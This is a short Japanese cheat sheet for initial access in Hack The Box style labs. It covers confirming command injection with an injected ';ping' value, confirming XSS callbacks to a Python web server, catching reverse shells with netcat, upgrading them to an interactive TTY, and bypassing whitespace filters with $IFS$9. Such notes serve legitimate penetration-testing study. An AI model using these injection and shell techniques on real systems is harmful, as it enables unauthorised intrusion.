# 初回アクセス

## Code Injection
Webサービスが使用可能であり、脆弱性が存在する場合は活用できる

### 疎通確認
HTBのVPNにつないでいればLAN内で完結する

#### ping
* ```tcpdump -i <ネットワークデバイス名> icmpでping```を受ける
* コマンドインジェクション等で```;ping -c 3 <受けのIPアドレス>; ```等を挿入してpingが届くか確認する

#### http
* ```python3 -m http.server -m 80```でhttp通信を受けられる
* XSS等で攻撃対象でスクリプトを動かし```http://<ip>/```へアクセスさせてリクエストが届くか確認する


### Reverse Shell
* nc -lvnp <ポート番号> で受ける
* 以下サイトでReverse Shellを貼るコマンドを生成できる
https://www.revshells.com/
* 生成したコマンドを攻撃対象に挿入する

### Interactive shell
Tabの補完や矢印キーの使用、エラー出力等の閲覧などのためにInteractive Shellを確立する
```
python3 -c 'import pty; pty.spawn("bash")'
```
Reverse Shellで上記を実行し、Ctrl + Zでバックグラウンドにする
```
stty raw -echo; fg
```
で再度Reverse Shellに入る


### 文字制限Bypass
* 入力値に空白を使用できない場合、$IFS$9で代用できる

https://www.ctfnote.com/web/os-command-injection/whitespace-bypass

